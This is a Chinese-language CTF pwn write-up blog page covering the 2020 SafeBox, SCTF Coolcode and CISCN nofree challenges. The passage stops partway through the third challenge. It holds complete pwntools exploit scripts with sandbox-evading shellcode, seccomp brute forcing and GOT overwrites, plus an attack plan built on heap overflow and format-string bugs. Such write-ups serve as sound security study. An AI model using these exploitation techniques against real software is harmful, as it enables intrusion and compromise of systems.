@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Ld1ng">
+
+
+
+    <meta name="description" content="Ld1ng's Blog">
+
+
+    <meta name="keywords" content="CTF,code,CUMT">
+
+
+<title>Aug_Match 2020 | Ld1ng</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Home</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Links</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Links</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Aug_Match 2020</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Ld1ng</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 1, 2020</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/PWN/">PWN</a>
+                            
+                        </span>
+                    
+                     
+    <span class="post-count">
+Words:
+    <a href="">4.5k</a>  
+    </span>
+
+
+    <span class="post-count">
+Time:
+    <a href="">20min</a>  
+    </span>
+
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>2020年在家摸鱼的暑假生活快结束了，终于要开学了，好长时间不更博客了，一直攒着一起发，再加上现在的题目网上详细解析越来越少，只能自己慢慢啃，我又啃得比较慢</p>
+<p>在这我会记录并复现一些比赛时的题目，权当一个月来的学习成果，还可以搞一个每月系列（不错不错）</p>
+<hr>
+<h1 id="0x01-2020天翼杯-SafeBox"><a href="#0x01-2020天翼杯-SafeBox" class="headerlink" title="0x01 2020天翼杯 SafeBox"></a>0x01 2020天翼杯 SafeBox</h1><p>先看题目描述：Try to get the secret from SafeBox! Flag is at /home/pwn/flag</p>
+<p>checksec，保护全开</p>
+<p><img src="https://s1.ax1x.com/2020/08/06/ag3VMT.png"></p>
+<p>mmap给dest赋予了7的权限，最后函数指针执行了dest。典型的shellcode。prtcl和seccomp开了沙盒。</p>
+<p><img src="https://i.loli.net/2020/08/24/6tvfJlVAZPeNmpQ.png" alt="image-20200824204011656"></p>
+<p>能调用的函数只有open和read，不能使用write，只能利用read函数读取flag，然后跟本地的flag一个字节一个字节去比较。</p>
+<p>还有当read的fd&lt;4时，会直接跳到0013KILL掉，就是说fd要大于等于4。所以写shellcode时open两次，第一次文件标识符是3，第二次文件标识符是4。</p>
+<p>爆破的方法就是把单个字节的flag(rsp+index)放进al寄存器，用ascii码0x20-0x7f之间的字符(content)一个个去比较，若cmp比较结果一致则改变ZF标志寄存器，然后用jz跳转x标签处，进行死循环。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;chall&#x27;</span>)</span><br><span class="line">p = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    <span class="keyword">global</span> p							<span class="comment">#在函数内部对函数外的变量进行操作，就需要在函数内部声明其为global全局变量</span></span><br><span class="line">	p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">	shellcode= shellcraft.<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>)  <span class="comment">#调用open的系统调用，open(&quot;flag&quot;)</span></span><br><span class="line">	shellcode+= shellcraft.<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>) <span class="comment">#因为fd要大于等于4，open两次</span></span><br><span class="line">	shellcode+=<span class="string">&#x27;&#x27;&#x27;						#read(4,rsp,0x64)</span></span><br><span class="line"><span class="string">    xor rax, rax            </span></span><br><span class="line"><span class="string">    push 0x64      					</span></span><br><span class="line"><span class="string">    pop rdx                        </span></span><br><span class="line"><span class="string">    mov rsi, rsp                    </span></span><br><span class="line"><span class="string">	push 4                              </span></span><br><span class="line"><span class="string">	pop rdi                           </span></span><br><span class="line"><span class="string">    syscall                         </span></span><br><span class="line"><span class="string">x:	mov rsi,rsp                         #由于我们往栈顶输入数据，因此此时的栈顶存放是flag的内容，将rsp的内容赋值给rsi</span></span><br><span class="line"><span class="string">	mov al,[rsi+&#x27;&#x27;&#x27;</span>+<span class="built_in">str</span>(index)+<span class="string">&#x27;&#x27;&#x27;]     #[rsi+index],取出[rsi+index]的内容,即将flag一个字节一个字节取出，存放在al寄存器里，方便后面爆破flag</span></span><br><span class="line"><span class="string">	cmp al,&#x27;&#x27;&#x27;</span>+<span class="built_in">str</span>(content)+<span class="string">&#x27;&#x27;&#x27;         #比较字符，与存放在al寄存器中的单个字节flag是否一致</span></span><br><span class="line"><span class="string">	jz x       						    #若一致则直接进入死循环，需要ctrl+d退出，若不一致则直接返回</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	p.sendafter(<span class="string">&quot;safe-execution box?\n&quot;</span>,asm(shellcode))</span><br><span class="line">	p.recv(timeout = <span class="number">1</span>)                 <span class="comment">#如果超过一秒就不等了</span></span><br><span class="line">	p.interactive()</span><br><span class="line">	p.close()</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:       		</span><br><span class="line">	flag=<span class="string">&quot;&quot;</span></span><br><span class="line">	index=<span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:                 <span class="comment">#读到末尾跳出循环</span></span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7f</span>):      <span class="comment">#content是ascii码0x20-0x7f对应的可见字符，for循环一个个试</span></span><br><span class="line">			<span class="keyword">try</span>:                         <span class="comment">#try except处理报错，flag没猜对就EOF报错跳到下面打印error</span></span><br><span class="line">				<span class="built_in">print</span> <span class="string">&quot;flag=&quot;</span>,flag</span><br><span class="line">				<span class="keyword">if</span> pwn(index,i) :       <span class="comment">#死循环得到正确值，强制退出后会返回1</span></span><br><span class="line">					flag+=<span class="built_in">chr</span>(i)		<span class="comment">#chr()返回ascii码对应字符，加在flag后面</span></span><br><span class="line">					index+=<span class="number">1</span>            <span class="comment">#进行下一个字节爆破</span></span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">except</span> EOFError:            <span class="comment">#若直接返回则抛出异常</span></span><br><span class="line">				<span class="built_in">print</span> <span class="string">&quot;error&quot;</span></span><br><span class="line">	<span class="built_in">print</span> flag</span><br><span class="line">    </span><br><span class="line"><span class="comment"># DASCTF&#123;0ee3530c57fb0b9c89e7af5d32b9f521&#125; </span></span><br></pre></td></tr></table></figure>
+
+<p>环境已经关了，体验很不好</p>
+<p>现在需要爆破的题越来越多，可能pwn的精髓就在于爆破吧</p>
+<h1 id="0x02-SCTF-Coolcode"><a href="#0x02-SCTF-Coolcode" class="headerlink" title="0x02 SCTF Coolcode"></a>0x02 SCTF Coolcode</h1><p>本题考验(极强的)shellcode编写能力</p>
+<p>拿到题目</p>
+<p><img src="https://i.loli.net/2020/08/24/8vs7gReZM93OVTl.png" alt="image-20200824174318169"></p>
+<p>看起来很像堆题，但是NX没开，估计可以利用shellcode，</p>
+<p><img src="https://i.loli.net/2020/08/24/sdPHhpxvm1I47w2.png" alt="image-20200824174746374"></p>
+<p>漏洞真的难找….在创建堆块时，对数组下标错误的使用了有符号数，导致如果我们输入<strong>负数</strong>也可以满足<code>v1 &lt;= 1</code>这样的检测，而在数组上方保存了例如stdin\stdout\stderr、got表等这样的可利用信息。<br>而且这个程序并没有开启FULL RELRO所以got表可写，这样其实我们可以直接劫持got表。</p>
+<p><strong>沙箱绕过</strong>：</p>
+<p>程序限制了我们能用的系统调用，而并没有open函数，所以不能利用orw</p>
+<p><img src="https://i.loli.net/2020/08/24/ozduG6qvYLw7afh.png"></p>
+<p>但是查询系统调用号表，发现fstat这个函数对应的系统调用号5，其实就是32位程序中open的系统调用号，而汇编中存在一条指令retfq可以供我们切换到32位指令模式，其原理是一个cs寄存器，cs=0x23时表示32位模式，cs=0x33时表示64位模式，</p>
+<p>我们只需要在进行retfq时保证此时rsp=shellcode地址，[rsp+8] = 0x23/0x33，就可以在我们想要的模式下执行shellcode。</p>
+<p><img src="https://i.loli.net/2020/08/24/DQvIXdqY62F5pHg.png"></p>
+<p>堆和bss段可执行，所以可以将shellcode写入bss段执行。<br>但是还有一点在于，程序限制输入字符只能是数字和大写字母，这样输入shellcode肯定是行不通的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">sub_400B16</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2 - <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (*(_BYTE *)(i + a1) &lt;= <span class="number">47</span> || *(_BYTE *)(i + a1) &gt; <span class="number">57</span>) &amp;&amp; (*(_BYTE *)(i + a1) &lt;= <span class="number">64</span> || *(_BYTE *)(i + a1) &gt; <span class="number">90</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以，还要先将exit()函数的got表改为ret，以跳过输入字符的检验。</p>
+<p>这道题我们的思路就很清晰：因为程序还限定了读取字节长度，为了方便一次性执行shellcode，我们先写入read将后面shellcode写入到bss段并执行。shellcode的内容：首先切换32位模式执行open()然后切换回64位执行read()、write()即可读取到flag</p>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = &#x27;./CoolCode&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;39.107.119.192 &quot;</span>, <span class="number">9999</span>)    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice :&quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&quot;messages: &quot;</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice :&quot;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice :&quot;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        xor eax, eax</span></span><br><span class="line"><span class="string">        mov edi, eax</span></span><br><span class="line"><span class="string">        push 0x60</span></span><br><span class="line"><span class="string">        pop rdx</span></span><br><span class="line"><span class="string">        mov esi, 0x1010101</span></span><br><span class="line"><span class="string">        xor esi, 0x1612601</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov esp, esi</span></span><br><span class="line"><span class="string">        retfq</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    open_x86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov esp, 0x602770</span></span><br><span class="line"><span class="string">        push 0x67616c66</span></span><br><span class="line"><span class="string">        push esp</span></span><br><span class="line"><span class="string">        pop ebx</span></span><br><span class="line"><span class="string">        xor ecx,ecx</span></span><br><span class="line"><span class="string">        mov eax,5</span></span><br><span class="line"><span class="string">        int 0x80</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    readflag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        push 0x33</span></span><br><span class="line"><span class="string">        push 0x60272e</span></span><br><span class="line"><span class="string">        retfq</span></span><br><span class="line"><span class="string">        mov rdi,0x3</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        mov rdx,0x60</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,1</span></span><br><span class="line"><span class="string">        mov rax,1</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    readflag = asm(readflag, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">    openflag = asm(open_x86)</span><br><span class="line">    add(-<span class="number">22</span>, <span class="string">&#x27;\xc3&#x27;</span>) <span class="comment">#exit_got-&gt;ret</span></span><br><span class="line">    add(-<span class="number">37</span>, asm(read, arch = <span class="string">&#x27;amd64&#x27;</span>)) <span class="comment">#free_got -&gt;read</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    payload = p64(<span class="number">0x602710</span>)+p64(<span class="number">0x23</span>)+openflag+readflag</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br><span class="line"><span class="comment">#SCTF&#123;LDI6Uk9PXa9e98rqFdtxHvN3qO1ZAmnBX76C5D0Ibckv4dqe&#125;</span></span><br><span class="line"><span class="comment">#随机生成的flag</span></span><br></pre></td></tr></table></figure>
+
+<p>本题需要高超的shellcode能力，/(ㄒoㄒ)/光看就够我理解半天了<br>比赛时有31解，还是很有难度的</p>
+<p><em><strong>Reference：</strong></em></p>
+<p><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">syscall table</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6645">shellcode 的艺术</a></p>
+<hr>
+<h1 id="0x03-2020-CISCN-nofree"><a href="#0x03-2020-CISCN-nofree" class="headerlink" title="0x03 2020 CISCN nofree"></a>0x03 2020 CISCN nofree</h1><p>国赛除了easyjsc，算是pwn1了，题目是这样的，功能一个添加一个编辑</p>
+<p><img src="https://i.loli.net/2020/09/01/ZA24zES1g6P7kDy.png" alt="image-20200901003905336"></p>
+<p>这就是本题难点，没有free，无法利用bins；没有show，无法泄露数据</p>
+<p>先看add函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = put_in_idx();<span class="comment">//这里限制了最多建立三个索引，但是没有进行检查，所以同一索引可以重复使用</span></span><br><span class="line">  idx = result;</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    result = input_0();</span><br><span class="line">    size = result;</span><br><span class="line">    <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">144</span> )<span class="comment">//每个块一次最多申请0x90大小</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)&amp;byte_6020C0[<span class="number">16</span> * idx + <span class="number">256</span>] = content(result);<span class="comment">//存放堆指针</span></span><br><span class="line">      result = size;</span><br><span class="line">      *(_QWORD *)&amp;byte_6020C0[<span class="number">16</span> * idx + <span class="number">264</span>] = size;<span class="comment">//存放size指针</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到content函数，里面并没有使用malloc()，而是使用了strdup()，也就是说malloc的堆块大小并不由你输入的size大小决定，而是你content内字符串的实际大小，而edit函数内容修改按照的是你输入的size，这就造成了堆溢出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = put_in_idx();</span><br><span class="line">  idx = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_QWORD *)&amp;byte_6020C0[<span class="number">16</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)result + <span class="number">256</span>];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">      result = input(*(<span class="keyword">void</span> **)&amp;byte_6020C0[<span class="number">16</span> * idx + <span class="number">256</span>], *(_QWORD *)&amp;byte_6020C0[<span class="number">16</span> * idx + <span class="number">264</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>add功能：最多3个块，大小在0~0x90之间，用的strdup函数</li>
+<li>edit功能：能编辑相应堆块，大小为add时写入的size</li>
+</ul>
+<p>简单来说，add时填0x20的大小，只填充0x10的字符串，edit的时候就存在溢出漏洞</p>
+<p>所以整体思路是先用house of orange，把top chunk扔到fastbin，然后利用堆溢出改fd指向bss上chunk array的地方，通过修改堆指针，来将strdup的got表改为printf，然后利用格式化字符串漏洞泄露出libc基址，最后同样的方法将strdup改为system函数，触发漏洞即可</p>
+<p>为了方便我在exp作了注释，就不再过多赘述<br>前面做的工作就是为了接近这三个指针，用来修改strdup的got表</p>
+<p><img src="https://i.loli.net/2020/09/01/MXNzjxZwI71ptac.png" alt="image-20200901012734532"></p>
+<p>在格式化字符串找偏移时不太顺利，主要还是动调的问题，因为函数比较多，要对照IDA的代码看，多用s步入，才能调出来，还要注意64位的六个寄存器传参的问题。</p>
+<p><img src="https://i.loli.net/2020/09/01/7ZvfkbM8O1S4zAd.png" alt="image-20200901011317070"></p>
+<p><img src="https://i.loli.net/2020/09/01/QTz31ln78SUtRxu.png" alt="image-20200901011403277"></p>
